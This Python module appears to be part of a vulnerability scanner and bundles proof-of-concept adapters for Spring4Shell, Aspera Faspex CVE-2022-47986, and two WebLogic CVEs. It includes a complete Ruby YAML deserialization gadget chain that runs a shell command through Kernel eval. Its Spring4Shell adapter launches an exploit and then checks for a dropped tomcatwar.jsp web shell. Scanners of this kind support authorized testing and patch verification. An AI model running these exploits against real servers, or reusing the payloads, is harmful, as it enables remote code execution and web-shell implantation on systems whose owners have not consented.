from .cve_2017_12615_poc import poc as cve_2017_12615_poc

# 新增 POC 适配器
def cve_2022_22965_poc(url, timeout=10):
    """
    Spring4Shell CVE-2022-22965 POC 适配器
    """
    try:
        from .CVE_2022_22965 import Exploit
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        exploit = Exploit(url)
        exploit.start()
        exploit.join(timeout=timeout)
        
        # 尝试访问可能的 shell URL
        from urllib.parse import urljoin
        shellurl = urljoin(url, 'tomcatwar.jsp')
        try:
            response = requests.get(shellurl, timeout=timeout, verify=False)
            if response.status_code == 200:
                return True, f"Vulnerable: {shellurl}"
        except:
            pass
        
        return False, "Not Vulnerable"
    except Exception as e:
        return False, str(e)

def cve_2022_47986_poc(url, timeout=10):
    """
    Aspera Faspex CVE-2022-47986 POC 适配器
    """
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        exploit_yaml = """
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "pew"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:PrettyPrint
             output: !ruby/object:Net::WriteAdapter
                 socket: &1 !ruby/object/module "Kernel"
                 method_id: :eval
             newline: "throw `whoami`"
             buffer: {}
             group_stack:
              - !ruby/object:PrettyPrint::Group
                break: true
         method_id: :breakable
"""
        
        target_url = f"{url}/aspera/faspex/package_relay/relay_package"
        uuid = "d7cb6601-6db9-43aa-8e6b-dfb4768647ec"
        
        payload = {
            "package_file_list": ["/"],
            "external_emails": exploit_yaml,
            "package_name": "assetnote_pack",
            "package_note": "hello from assetnote team",
            "original_sender_name": "assetnote",
            "package_uuid": uuid,
            "metadata_human_readable": "Yes",
            "forward": "pew",
            "metadata_json": '{}',
            "delivery_uuid": uuid,
            "delivery_sender_name": "assetnote",
            "delivery_title": "TEST",
            "delivery_note": "TEST",
            "delete_after_download": True,
            "delete_after_download_condition": "IDK",
        }
        
        response = requests.post(target_url, json=payload, verify=False, timeout=timeout)
        
        if response.status_code == 200:
            return True, "Vulnerable"
        return False, "Not Vulnerable"
    except Exception as e:
        return False, str(e)

def cve_2020_14756_poc(url, timeout=10):
    """
    WebLogic CVE-2020-14756 POC 适配器
    """
    try:
        from .CVE_2020_14756 import TestPOC
        from urllib.parse import urlparse
        
        poc = TestPOC()
        poc.url = url
        
        result = poc._verify()
        
        if result and hasattr(result, 'success'):
            return True, "Vulnerable"
        return False, "Not Vulnerable"
    except Exception as e:
        return False, str(e)

def cve_2023_21839_poc(url, timeout=10):
    """
    WebLogic CVE-2023-21839 POC 适配器
    """
    try:
        from .CVE_2023_21839 import POC
        from urllib.parse import urlparse
        
        parsed = urlparse(url)
        target = parsed.hostname
        port = parsed.port or 7001
        ldap = "ldap://127.0.0.1:1389/exp"
        
        poc = POC(target, port, ldap)
        poc.verify()
        
        return True, "Vulnerable"
    except Exception as e:
        return False, str(e)

__all__ = [
    'cve_2017_12615_poc',
    'cve_2022_22965_poc',
    'cve_2022_47986_poc',
    'cve_2020_14756_poc',
    'cve_2023_21839_poc'
]
